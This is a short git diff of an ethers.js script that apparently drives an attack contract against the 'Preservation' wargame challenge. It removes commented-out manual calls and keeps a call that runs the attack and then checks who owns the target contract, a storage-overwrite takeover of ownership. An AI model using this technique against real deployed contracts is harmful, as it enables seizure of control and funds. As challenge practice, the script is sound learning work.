@@ -9,22 +9,6 @@ async function main() {
   const contract = await ethers.getContractAt("Preservation", CONTRACT_ADDRESS, signer)
   const attackContract = await ethers.getContractAt("PreservationAttack", ATTACK_ADDRESS, signer)
 
-  /*console.log(await contract.timeZone1Library())
-  console.log(await contract.timeZone2Library())
-  console.log(await contract.owner())
-
-  await contract.setFirstTime(ATTACK_ADDRESS)
-
-  console.log(await contract.timeZone1Library())
-  console.log(await contract.timeZone2Library())
-  console.log(await contract.owner())
-
-  await contract.setFirstTime(PLAYER_ADDRESS)
-
-  console.log(await contract.timeZone1Library())
-  console.log(await contract.timeZone2Library())
-  console.log(await contract.owner())*/
-
   await attackContract.attack()
 
   console.log(await contract.owner())
